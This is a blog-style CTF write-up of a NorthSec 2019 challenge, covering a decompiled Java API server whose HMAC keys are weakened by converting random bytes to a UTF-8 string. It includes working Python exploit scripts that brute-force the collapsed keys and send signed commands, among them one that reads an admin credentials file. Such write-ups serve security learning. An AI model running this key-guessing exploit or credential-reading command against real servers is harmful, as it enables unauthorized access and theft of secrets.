---
layout: post
title:  "NorthSec CTF 2019 Part 2: Java API"
date:   2019-05-19 00:00:00
categories: security ctf northsec 2019 
---

For some details about Northsec and my first CTF write-up, [see Part 1](/securit/ctf/northsec/2019/2019/05/19/northsec-ctf-part-1-doom.html).

Another NorthSec CTF problem I worked on this year was the following: 

- the user says they're "unable to log into the server" with a specific hostname
- they include a JAR file

Unpacking the jar file reveals a bunch of class files for what looks like a TCP server.
Fortunately IntelliJ is really good at decompiling class files, so we could open `MainServer.class` and see:

```
package com.lost.api;

import java.net.ServerSocket;
import java.net.Socket;

public class MainServer {
    public MainServer() {
    }

    public static void main(String... a) throws Exception {
        Throwable var1 = null;
        Object var2 = null;

        try {
            ServerSocket listener = new ServerSocket(7040, 50);

            try {
                while(true) {
                    while(true) {
                        try {
                            Socket socket = listener.accept();
                            Thread thread = new Thread(new APIHandle(socket));
                            thread.start();
                        } catch (Exception var12) {
                            ;
                        }
                    }
                }
            } finally {
                if (listener != null) {
                    listener.close();
                }

            }
        } catch (Throwable var14) {
            if (var1 == null) {
                var1 = var14;
            } else if (var1 != var14) {
                var1.addSuppressed(var14);
            }

            throw var1;
        }
    }
}
```

So the server listens on port 7040, and every incoming request is served by a new `APIHandle`. Decompiling `APIHandle` gives us:

```
package com.lost.api;

... // some imports 

public class APIHandle implements Runnable {
    private Socket socket;
    private String key;

    public APIHandle(Socket socket) {
        this.socket = socket;
    }

    public void run() {
        try {
            OutputStream os = this.socket.getOutputStream();
            InputStream is = this.socket.getInputStream();
            this.key = Key.generateKey();

            while(true) {
                while(true) {
                    Message msg = Message.readMessage(is);
                    String var4;
                    switch((var4 = msg.getCommandName()).hashCode()) {
                    case -977729853:
                        if (var4.equals("sendcommand")) {
                            CommandHandle.handleCommand(msg, os, this.key);
                        }
                        break;
                    case -74491644:
                        if (var4.equals("getinfo")) {
                            InfoHandle.handleInfo(msg, os, this.key);
                        }
                        break;
                    case 103149417:
                        if (var4.equals("login")) {
                            LoginHandle.handleLogin(msg, os, this.key);
                        }
                    }
                }
            }
        }
	// some error handling 
    }
}
```

```
   // From Key.class
   public static String generateKey() {
        SecureRandom sr = new SecureRandom();
        byte[] key = new byte[10];
        sr.nextBytes(key);
        return new String(key);
    }
```

Each incoming connection generates a new `Key`, then loops over incoming `Message`s and runs the corresponding commands.
Incoming messages were just two strings (`command`, `data`), each prefixed with their length as an integer. 
So I wrote a small Python script to run the `getinfo` command:

```
import socket

host = # hostname from the problem
port = 7040

def get_info():
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        command='getinfo'
        data=''
        s.sendall(len(command).to_bytes(4, 'big'))
        s.sendall(bytes(command, 'utf-8'))
        s.sendall(len(data).to_bytes(4, 'big'))
        s.sendall(bytes(data, 'utf-8'))
        resp = []
        l = int.from_bytes(s.recv(4), 'big')
        print("len: {}".format(l))
        msg = s.recv(l)
        print("message: {}".format(str(msg, 'utf-8')))

get_info()
```

This printed:
```
len: 17
message: Remote API v1.0.5
```

Which lined up with the code in `InfoHandle` - I was on the right track. The other two commands both looked like possible sources of flags:

```
   // From LoginHandle.class
   public static void handleLogin(Message msg, OutputStream os, String key) throws IOException, URISyntaxException {
        String adminConfig = new String(Files.readAllBytes(Paths.get(new URI("/opt/config/admin"))));
        String[] parts = adminConfig.split(":");
        String username = parts[0];
        String password = parts[1];
        String greeting = parts[2];
        String requestUsername = msg.getData().split(":")[0];
        String requestPassword = msg.getData().split(":")[1];
        DataOutputStream dos = new DataOutputStream(os);
        if (username.equals(requestUsername) && password.equals(requestPassword)) {
            byte[] data = greeting.getBytes();
            dos.write(data.length);
            dos.write(data, 0, data.length);
            dos.write(16);
            dos.write(key.getBytes(), 0, 16);
        } else {
            dos.write(4);
            dos.write("FAIL".getBytes(), 0, 4);
        }

    }
```

```
    // From CommandHandle.class
    public static void handleCommand(Message msg, OutputStream os, String key) throws Exception {
        String data = msg.getData();
        String signature = data.substring(data.length() - 128, data.length());
        String command = data.substring(0, data.length() - 128);
        DataOutputStream dos = new DataOutputStream(os);
        byte[] res = new byte[1024];
        if (validateSignature(command, signature, key)) {
            dos.write(1);
            Socket rs = new Socket("localhost", 3333);
            rs.getOutputStream().write(command.getBytes());
            int l = rs.getInputStream().read(res);
            dos.write(l);
            dos.write(res, 0, l);
        } else {
            dos.write(0);
        }

    }

    private static boolean validateSignature(String command, String signature, String key) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(), "HmacSHA512");
        Mac mac = Mac.getInstance("HmacSHA512");
        mac.init(secretKeySpec);
        String expected = bytesToHex(mac.doFinal(command.getBytes()));
        return expected.equals(signature);
    }

    private static String bytesToHex(byte[] bytes) {
        char[] hexArray = "0123456789abcdef".toCharArray();
        char[] hexChars = new char[bytes.length * 2];

        for(int j = 0; j < bytes.length; ++j) {
            int v = bytes[j] & 255;
            hexChars[j * 2] = hexArray[v >>> 4];
            hexChars[j * 2 + 1] = hexArray[v & 15];
        }

        return new String(hexChars);
    }
```

In one case, we'd need to guess the username and password from a file. In the other, we'd need to guess the key used to HMAC commands for a given session.
Both of these seemed pretty impossible, but I coded up the client to run both types of messages. 
Attempting to login caused the server to close the connection, while running a command did what I expected. 
So it seemed like `login` was a red herring - it raised an exception becuase the file was malformed, and never sent `FAIL`.

I showed my teammate Clayton the command code, pretty confident that was where the flag would be. 
He zeroed in the fact that `key` was being round-tripped through a `String` - we get 10 bytes from `SecureRandom`, but turning them into a String forces them into whatever the system encoding is (probably UTF-8).
As someone who's mostly done Golang for the past 4 years, this wasn't something I had considered, since you can put any bytes you like in Golang's strings.

Running `generateKey()` in a loop confirmed that the keys had a bias towards the [replacement character (0xFFFD)](https://en.wikipedia.org/wiki/Specials_(Unicode_block)#Replacement_character), which in UTF-8 is `0xEFBFBD`.
Java was replacing any invalid UTF-8 codepoints in the key with this one character, which greatly reduced the space of keys we would need to try.

At the time, Clayton generated a few million keys and we took the 3 most common keys to try. 
Looking at the set of keys now, it's obvious they're just sequences of 8, 9 or 10 replacement characters, depending on how many invalid codepoints a given 10-byte sequence turned into.
Since the server regenerates the key per connection, we:

- open a new socket, to get a new key
- try sending the same command three times with different keys
- if any of them succeed, keep the socket open and start a shell so we can send more commands
- if the key isn't all replacement characters, close the socket and try again

It took around 10000 attempts for this to get us a valid key: 

```
import fileinput
import os
import time
import hmac
import hashlib
import socket

def hex(s):
    hex_chars = '0123456789abcdef'
    out = ""
    for c in s:
       out += hex_chars[c >> 4]
       out += hex_chars[c&15]
    return out

# Once we know the key for a given socket, let me test arbitrary inputs
def repl(socket, key):
    for line in fileinput.input():
        send_msg(socket, key, line)

def send_msg(s, key, remote_cmd):
    command='sendcommand'
    h = hmac.new(bytes.fromhex(key), msg=bytes(remote_cmd, 'utf-8'), digestmod=hashlib.sha512).digest()
    data = remote_cmd+hex(h)
    s.sendall(len(command).to_bytes(4, 'big'))
    s.sendall(bytes(command, 'utf-8'))
    s.sendall(len(data).to_bytes(4, 'big'))
    s.sendall(bytes(data, 'utf-8'))
    success = s.recv(1)
    if success[0]  == 0:
        return False

    resp = s.recv(1)
    l = int.from_bytes(resp, 'big')

    if l > 0:
        print("len: {}".format(l))
        msg = s.recv(l)
        print("message: {}".format(str(resp[3:] + msg, 'utf-8')))
        return True
    return False

def send_command():
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        remote_cmd='cat /opt/config/admin'
        # Probable keys from Clayton
        for key in ['efbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbd', 'efbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbd', 'efbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbdefbfbd']:
             if send_msg(s, key, remote_cmd):
                  repl(s, key)

for i in range(100000):
    print(i)
    send_command()
```

Once we guessed the key the server just spit out a flag! I expected we'd be able to send some commands to edit the password file and use the login code, but we tested a bunch of input strings and got the same response with the same flag from all of them, so we moved on.

This was a pretty simple problem, but it demonstrated to me the value of heuristics, iterating quickly and "good enough" problem solving - under time pressure, it wasn't as important to understand exactly what the characters in these likely keys were. We figured out the keys weren't random, we found the likely keys, we iterated for 10 minutes until we guessed right. Reading about UTF-8 on Wikipedia is for after, when you're doing the write-up.
